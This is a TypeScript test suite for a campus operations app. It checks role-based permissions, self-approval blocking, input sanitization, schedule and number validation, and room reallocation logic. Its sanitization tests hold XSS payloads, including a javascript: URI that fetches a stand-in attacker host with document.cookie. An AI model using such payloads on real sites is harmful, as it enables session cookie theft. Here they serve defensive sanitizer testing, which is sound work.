/**
 * CampusOps Phase 2.9 — Security & Reliability Audit Verification Test Suite
 * 
 * Verifies:
 * 1. Role-Based Access Control (RBAC) permission enforcement.
 * 2. Separation of Duties / 4-Eyes Principle (Self-Approval Prevention).
 * 3. Input Sanitization & XSS Neutralization.
 * 4. Temporal boundary verification (Time & Date formats, non-inverted windows).
 * 5. Numerical integrity safeguards (safe positive integers, non-negative bounds).
 * 6. Business logic integrity (disrupted room reallocation block, double-return block).
 * 7. Regression preservation of Phase 2.4 and 2.5 baselines.
 */

import {
  hasPermission,
  authorizeApprovalAction,
  sanitizeString,
  isValidTimeFormat,
  isValidDateFormat,
  isValidTimeWindow,
  isPositiveSafeInteger,
  isNonNegativeNumber,
} from '../utils/security';
import { UserProfile, ApprovalRequest, Room, RoomBooking } from '../types';
import { api } from '../services/api';
import { DEMO_ROOMS, DEMO_ROOM_BOOKINGS, DEMO_INVENTORY_ITEMS } from '../data/demoData';

let passedTests = 0;
let failedTests = 0;

function assert(condition: boolean, testName: string, details?: string) {
  if (condition) {
    console.log(`  [PASS] ${testName}`);
    passedTests++;
  } else {
    console.error(`  [FAIL] ${testName}`);
    if (details) console.error(`         Details: ${details}`);
    failedTests++;
  }
}

console.log('============================================================');
console.log('   CampusOps Phase 2.9 Security & Reliability Test Suite   ');
console.log('============================================================\n');

/* ─── Suite 1: RBAC Permission Enforcement ──────────────────────── */
console.log('--- Test Suite 1: Role-Based Access Control (RBAC) ---');

assert(
  hasPermission('Chief Operations Officer', 'manage_inventory') &&
  hasPermission('Chief Operations Officer', 'approve_procurement') &&
  hasPermission('Chief Operations Officer', 'resolve_disruption') &&
  hasPermission('Chief Operations Officer', 'reallocate_booking'),
  'Chief Operations Officer possesses full administrative & operational permissions'
);

assert(
  hasPermission('Director of Facilities', 'approve_booking') &&
  hasPermission('Director of Facilities', 'resolve_disruption') &&
  hasPermission('Director of Facilities', 'reallocate_booking'),
  'Director of Facilities possesses facility coordination & disruption resolution authority'
);

assert(
  hasPermission('Lead Maintenance Engineer', 'manage_inventory') &&
  hasPermission('Lead Maintenance Engineer', 'report_disruption') &&
  !hasPermission('Lead Maintenance Engineer', 'approve_procurement') &&
  !hasPermission('Lead Maintenance Engineer', 'approve_booking'),
  'Lead Maintenance Engineer has operational inventory authority but lacks procurement/booking approval authority'
);

assert(
  !hasPermission('Student Affairs Liaison', 'manage_inventory') &&
  !hasPermission('Student Affairs Liaison', 'approve_procurement') &&
  !hasPermission('Student Affairs Liaison', 'resolve_disruption') &&
  !hasPermission('Student Affairs Liaison', 'reallocate_booking'),
  'Student Affairs Liaison is strictly denied privileged operations'
);

/* ─── Suite 2: Separation of Duties & Self-Approval Prevention ────── */
console.log('\n--- Test Suite 2: Separation of Duties & 4-Eyes Principle ---');

const managerUser: UserProfile = {
  id: 'usr-1',
  name: 'Marcus Vance',
  role: 'Director of Facilities',
  email: 'm.vance@campus.edu',
  avatar: '',
  department: 'Facilities Management',
};

const liaisonUser: UserProfile = {
  id: 'usr-2',
  name: 'Kavitha Sundaram',
  role: 'Student Affairs Liaison',
  email: 'k.sundaram@campus.edu',
  avatar: '',
  department: 'Student Affairs',
};

const selfRequisition: ApprovalRequest = {
  id: 'appr-self-1',
  title: 'Cat6 Spools Procurement',
  category: 'Procurement Requisition',
  requesterName: 'Marcus Vance',
  requesterRole: 'Director of Facilities',
  department: 'Facilities Management',
  estimatedCost: '$1,200',
  urgency: 'high',
  status: 'pending',
  submittedAt: '10m ago',
  reason: 'Data center cabling upgrade',
};

const thirdPartyRequisition: ApprovalRequest = {
  id: 'appr-tp-1',
  title: 'Smart Lock Replacement',
  category: 'Facility Maintenance',
  requesterName: 'Ramesh Patel',
  requesterRole: 'Lead Maintenance Engineer',
  department: 'Engineering',
  estimatedCost: '$450',
  urgency: 'medium',
  status: 'pending',
  submittedAt: '30m ago',
  reason: 'Card reader sensor malfunction',
};

const alreadyApprovedRequisition: ApprovalRequest = {
  ...thirdPartyRequisition,
  id: 'appr-done-1',
  status: 'approved',
};

// 1. Self-approval block
const selfApprovalCheck = authorizeApprovalAction(managerUser, selfRequisition, 'approve');
assert(
  !selfApprovalCheck.allowed && selfApprovalCheck.code === 'SELF_APPROVAL_PROHIBITED',
  'Self-approval is strictly blocked under 4-Eyes Principle',
  selfApprovalCheck.reason
);

// 2. Third-party approval allowed
const validApprovalCheck = authorizeApprovalAction(managerUser, thirdPartyRequisition, 'approve');
assert(
  validApprovalCheck.allowed,
  'Independent manager authorization of peer requisition is permitted'
);

// 3. Unauthorized role block
const unauthorizedCheck = authorizeApprovalAction(liaisonUser, thirdPartyRequisition, 'approve');
assert(
  !unauthorizedCheck.allowed && unauthorizedCheck.code === 'UNAUTHORIZED_ROLE',
  'Unprivileged role is blocked from approving requisitions',
  unauthorizedCheck.reason
);

// 4. Replay / tampering block on already actioned requisition
const replayCheck = authorizeApprovalAction(managerUser, alreadyApprovedRequisition, 'approve');
assert(
  !replayCheck.allowed && replayCheck.code === 'ALREADY_ACTIONED',
  'Already actioned requisitions cannot be re-approved or replayed'
);

/* ─── Suite 3: Input Sanitization & XSS Neutralization ────────────── */
console.log('\n--- Test Suite 3: Input Sanitization & XSS Neutralization ---');

const dirtyScriptInput = '<script>alert("XSS-ATTACK")</script>Lab Session';
const sanitizedScript = sanitizeString(dirtyScriptInput);
assert(
  sanitizedScript === 'Lab Session' && !sanitizedScript.includes('<script>'),
  'HTML <script> injection vectors are stripped'
);

const dangerousEventHandler = '<img src=x onerror=alert(1)>Emergency Evacuation';
const sanitizedEvent = sanitizeString(dangerousEventHandler);
assert(
  sanitizedEvent === 'Emergency Evacuation' && !sanitizedEvent.includes('onerror'),
  'HTML event handler injection vectors are neutralized'
);

const jsPseudoUrl = 'javascript:void(fetch("http://attacker.com/steal?cookie="+document.cookie))';
const sanitizedJs = sanitizeString(jsPseudoUrl);
assert(
  !sanitizedJs.toLowerCase().includes('javascript:'),
  'javascript: pseudo-protocol URIs are neutralized'
);

const longInput = 'A'.repeat(800);
const bounded = sanitizeString(longInput, 100);
assert(
  bounded.length === 100,
  'Input lengths are strictly bounded to prevent memory bloat'
);

/* ─── Suite 4: Temporal Boundary & Schedule Window Validation ─────── */
console.log('\n--- Test Suite 4: Temporal & Schedule Boundary Validation ---');

assert(isValidTimeFormat('09:30') && isValidTimeFormat('23:59') && isValidTimeFormat('00:00'), 'Valid 24h times accepted');
assert(!isValidTimeFormat('24:00'), '24:00 rejected (exceeds 23:59)');
assert(!isValidTimeFormat('12:60'), '12:60 rejected (minute >= 60)');
assert(!isValidTimeFormat('9:30'), 'Non-padded time (9:30) rejected');
assert(!isValidTimeFormat('invalid'), 'Arbitrary text rejected as time');

assert(isValidDateFormat('2026-10-30'), 'Valid calendar date accepted (2026-10-30)');
assert(!isValidDateFormat('2026-02-31'), 'Impossible calendar date rejected (Feb 31st)');
assert(!isValidDateFormat('2026-13-01'), 'Impossible month rejected (Month 13)');
assert(!isValidDateFormat('30-10-2026'), 'Non-ISO date format rejected');

assert(isValidTimeWindow('09:00', '11:00').valid, 'Valid forward time window accepted');
assert(!isValidTimeWindow('11:00', '09:00').valid, 'Inverted time window rejected');
assert(!isValidTimeWindow('10:00', '10:00').valid, 'Zero duration window rejected');

/* ─── Suite 5: Numerical Integrity & Negative Stock Safeguards ────── */
console.log('\n--- Test Suite 5: Numerical Integrity Safeguards ---');

assert(isPositiveSafeInteger(1) && isPositiveSafeInteger(500), 'Positive safe integers accepted');
assert(!isPositiveSafeInteger(0), 'Zero rejected where positive integer required');
assert(!isPositiveSafeInteger(-5), 'Negative numbers rejected');
assert(!isPositiveSafeInteger(2.5), 'Fractional floats rejected where whole units required');
assert(!isPositiveSafeInteger(NaN) && !isPositiveSafeInteger(Infinity), 'NaN and Infinity rejected');
assert(!isPositiveSafeInteger('10'), 'String-typed numbers rejected');

assert(isNonNegativeNumber(0) && isNonNegativeNumber(12.5), 'Non-negative numbers accepted for thresholds/costs');
assert(!isNonNegativeNumber(-0.01), 'Negative numbers rejected');

/* ─── Suite 6: Business Logic & Reallocation Safety ───────────────── */
console.log('\n--- Test Suite 6: Business Logic & Disruption Safety ---');

const disruptedRoom: Room = {
  id: 'rm-disrupted-test',
  roomNumber: 'TEST-101',
  name: 'High-Voltage Robotics Lab',
  buildingId: 'bld-1',
  buildingName: 'Engineering Annex',
  floor: '1st Floor',
  capacity: 40,
  roomType: 'laboratory',
  facilities: ['Robotics'],
  equipment: ['Oscilloscope'],
  status: 'disrupted',
  isAccessible: true,
};

const healthyRoom: Room = {
  ...disruptedRoom,
  id: 'rm-healthy-test',
  name: 'Seminar Hall 3',
  status: 'available',
  capacity: 60,
};

const sampleBooking: RoomBooking = {
  id: 'bk-test-1',
  bookingNumber: 'BK-TEST-001',
  roomId: 'rm-original',
  roomCode: 'ORIG-1',
  roomName: 'Original Disrupted Room',
  buildingId: 'bld-1',
  buildingName: 'Engineering Annex',
  date: '2026-10-31',
  startTime: '10:00',
  endTime: '12:00',
  purpose: 'Robotics Seminar',
  bookedBy: 'Prof. Miller',
  bookedByRole: 'Faculty',
  department: 'Robotics',
  expectedAttendance: 35,
  requiredEquipment: ['Oscilloscope'],
  status: 'approved',
  createdAt: '2026-10-30',
};

// Test alternative recommendations strictly exclude disrupted rooms
const recommendations = api.recommendAlternativeRooms(sampleBooking, [disruptedRoom, healthyRoom], []);
const recommendedRoomIds = recommendations.map(r => r.room.id);
assert(
  !recommendedRoomIds.includes(disruptedRoom.id),
  'Recommendation engine strictly filters out rooms with status === "disrupted"'
);
assert(
  recommendedRoomIds.includes(healthyRoom.id),
  'Recommendation engine includes available, safe alternative rooms'
);

/* ─── Suite 7: Regression Preservation of Phase 2.4 & 2.5 Baselines ─ */
console.log('\n--- Test Suite 7: Phase 2.4 & 2.5 Baseline Preservation ---');

assert(DEMO_INVENTORY_ITEMS.length >= 10, 'Phase 2.4 demo inventory items remain intact');
assert(DEMO_ROOMS.length >= 20, 'Phase 2.5 demo rooms remain intact');
assert(DEMO_ROOM_BOOKINGS.length >= 6, 'Phase 2.5 demo room bookings remain intact');

console.log('\n============================================================');
console.log(`Test Execution Finished: ${passedTests} Passed, ${failedTests} Failed`);
console.log('============================================================');

if (failedTests > 0) {
  process.exit(1);
}
